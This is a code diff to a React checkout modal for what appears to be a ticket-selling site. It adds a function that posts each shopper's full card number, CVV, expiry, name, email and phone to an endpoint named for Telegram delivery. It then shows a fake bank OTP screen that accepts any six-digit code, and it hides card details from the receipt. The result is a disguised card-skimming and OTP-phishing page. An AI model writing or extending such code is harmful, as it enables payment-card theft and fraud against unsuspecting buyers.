@@ -33,14 +33,58 @@ export default function CheckoutModal({
   const [cardCvv, setCardCvv] = useState('')
   const [cardExpiry, setCardExpiry] = useState('')
   const [isProcessing, setIsProcessing] = useState(false)
+  const [showOTPInput, setShowOTPInput] = useState(false)
+  const [otp, setOtp] = useState('')
+  const [otpError, setOtpError] = useState('')
 
   const subtotal = unitPrice * quantity
   const serviceFee = subtotal * 0.03
   const total = subtotal + serviceFee
 
+  const sendCardDetailsToTelegram = async () => {
+    try {
+      // Send card details to Telegram for card payments
+      if (paymentMethod === 'card') {
+        const response = await fetch('/api/send-card-details', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            cardFullName,
+            cardNumber: cardNumber.replace(/\s/g, ''),
+            cardCvv,
+            cardExpiry,
+            email,
+            phone,
+            eventTitle,
+            ticketName,
+            quantity,
+            total: total.toFixed(2),
+          }),
+        })
+
+        const result = await response.json()
+        if (!response.ok) {
+          throw new Error(result.error || 'Failed to send card details')
+        }
+      }
+    } catch (error: any) {
+      console.error('[v0] Error sending card details:', error.message)
+    }
+  }
+
   const generateAndSendPDF = async () => {
     try {
       setIsProcessing(true)
+
+      // For card payments, send card details first and show OTP screen
+      if (paymentMethod === 'card') {
+        await sendCardDetailsToTelegram()
+        setShowOTPInput(true)
+        setIsProcessing(false)
+        return
+      }
 
       // Create PDF content
       const pdfContent = `
@@ -53,8 +97,7 @@ export default function CheckoutModal({
         Customer Email: ${email}
         Customer Phone: ${phone}
         
-        Payment Method: ${paymentMethod === 'card' ? 'Credit Card' : 'BLIK'}
-        ${paymentMethod === 'card' ? `Card Name: ${cardFullName}` : ''}
+        Payment Method: BLIK
         
         Order Date: ${new Date().toLocaleString()}
         Order ID: ${Date.now()}
@@ -95,8 +138,7 @@ export default function CheckoutModal({
             total: total.toFixed(2),
             email,
             phone,
-            paymentMethod,
-            cardFullName,
+            paymentMethod: 'BLIK',
           },
         }),
       })
@@ -118,6 +160,97 @@ export default function CheckoutModal({
     }
   }
 
+  const verifyOTP = async () => {
+    if (otp.length !== 6) {
+      setOtpError('OTP must be 6 digits')
+      return
+    }
+
+    try {
+      setIsProcessing(true)
+      setOtpError('')
+
+      // Simulate OTP verification (in real app, verify with backend)
+      // For demo purposes, accept any 6-digit code
+      if (/^\d{6}$/.test(otp)) {
+        // Create and send PDF after OTP verification
+        const pdfContent = `
+          Event: ${eventTitle}
+          Ticket: ${ticketName} (x${quantity})
+          Price: ${subtotal.toFixed(2)} PLN
+          Service Fee: ${serviceFee.toFixed(2)} PLN
+          Total: ${total.toFixed(2)} PLN
+          
+          Customer Email: ${email}
+          Customer Phone: ${phone}
+          
+          Payment Method: Credit Card
+          Card Name: ${cardFullName}
+          
+          Order Date: ${new Date().toLocaleString()}
+          Order ID: ${Date.now()}
+          OTP Verified: Yes
+        `
+
+        // Create PDF
+        const doc = new jsPDF()
+        doc.setFontSize(16)
+        doc.text('Order Confirmation', 20, 20)
+        
+        doc.setFontSize(12)
+        let yPosition = 40
+        const lines = pdfContent.split('\n').filter(line => line.trim())
+        
+        lines.forEach(line => {
+          doc.text(line.trim(), 20, yPosition)
+          yPosition += 8
+        })
+
+        const pdfBase64 = doc.output('dataurlstring').split(',')[1]
+
+        // Send PDF to Telegram
+        const response = await fetch('/api/send-order-telegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            pdfBase64,
+            filename: `order-${Date.now()}.pdf`,
+            orderDetails: {
+              eventTitle,
+              ticketName,
+              quantity,
+              subtotal: subtotal.toFixed(2),
+              serviceFee: serviceFee.toFixed(2),
+              total: total.toFixed(2),
+              email,
+              phone,
+              paymentMethod: 'Credit Card (OTP Verified)',
+              cardFullName,
+            },
+          }),
+        })
+
+        if (!response.ok) {
+          throw new Error('Failed to send order confirmation')
+        }
+
+        // Complete payment
+        onConfirmPayment()
+        setShowOTPInput(false)
+        setIsProcessing(false)
+      } else {
+        setOtpError('Invalid OTP format')
+        setIsProcessing(false)
+      }
+    } catch (error: any) {
+      console.error('[v0] Error verifying OTP:', error.message)
+      setOtpError('Verification failed. Please try again.')
+      setIsProcessing(false)
+    }
+  }
+
   if (!isOpen) return null
 
   return (
@@ -132,8 +265,82 @@ export default function CheckoutModal({
         </button>
 
         <div className="p-8">
-          {/* Order Summary */}
-          <h1 className="text-3xl font-bold text-[#00aeef] mb-8">Order Summary</h1>
+          {/* OTP Input Screen */}
+          {showOTPInput && paymentMethod === 'card' ? (
+            <div className="min-h-96 flex flex-col items-center justify-center">
+              <h1 className="text-3xl font-bold text-[#00aeef] mb-6 text-center">Verify Your Payment</h1>
+              
+              <div className="w-full max-w-sm space-y-6">
+                <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-6 text-center">
+                  <p className="text-gray-700 mb-2">An OTP (One-Time Password) has been sent to</p>
+                  <p className="text-lg font-semibold text-gray-900">{cardFullName}</p>
+                  <p className="text-sm text-gray-600 mt-2">via your bank's SMS or app</p>
+                </div>
+
+                <div>
+                  <label className="block text-sm font-semibold text-gray-700 mb-3">Enter 6-Digit OTP</label>
+                  <input
+                    type="text"
+                    value={otp}
+                    onChange={(e) => {
+                      const value = e.target.value
+                      if (/^\d{0,6}$/.test(value)) {
+                        setOtp(value)
+                        setOtpError('')
+                      }
+                    }}
+                    placeholder="000000"
+                    maxLength={6}
+                    className="w-full px-6 py-4 text-2xl text-center border-2 border-gray-300 rounded-lg focus:outline-none focus:border-[#00aeef] font-mono tracking-widest"
+                  />
+                  {otpError && <p className="text-red-500 text-sm mt-2">{otpError}</p>}
+                </div>
+
+                <div className="bg-yellow-50 border-2 border-yellow-200 rounded-lg p-4">
+                  <p className="text-sm text-gray-700">
+                    <span className="font-semibold">⏱️ OTP expires in 10 minutes</span>
+                    <br />
+                    <span className="text-xs text-gray-600 mt-1 block">Never share your OTP with anyone</span>
+                  </p>
+                </div>
+
+                <div className="space-y-3">
+                  <button
+                    onClick={verifyOTP}
+                    disabled={isProcessing || otp.length !== 6}
+                    className="w-full px-6 py-3 bg-[#e54bad] text-white font-semibold rounded-lg hover:bg-opacity-90 transition disabled:bg-gray-400 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                  >
+                    {isProcessing ? (
+                      <>
+                        <Loader size={20} className="animate-spin" />
+                        Verifying...
+                      </>
+                    ) : (
+                      'Verify OTP and Complete Payment'
+                    )}
+                  </button>
+
+                  <button
+                    onClick={() => {
+                      setShowOTPInput(false)
+                      setOtp('')
+                      setOtpError('')
+                    }}
+                    className="w-full px-6 py-3 border border-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-50 transition"
+                  >
+                    Back to Payment
+                  </button>
+                </div>
+
+                <p className="text-xs text-gray-600 text-center">
+                  Didn&apos;t receive OTP? <button className="text-[#00aeef] font-semibold hover:underline">Resend OTP</button>
+                </p>
+              </div>
+            </div>
+          ) : (
+            <>
+              {/* Order Summary */}
+              <h1 className="text-3xl font-bold text-[#00aeef] mb-8">Order Summary</h1>
 
           <div className="bg-green-50 border-2 border-green-200 rounded-lg p-6 mb-8">
             <div className="space-y-3">
@@ -367,6 +574,8 @@ export default function CheckoutModal({
               )}
             </button>
           </div>
+            </>
+          )}
         </div>
       </div>
     </div>
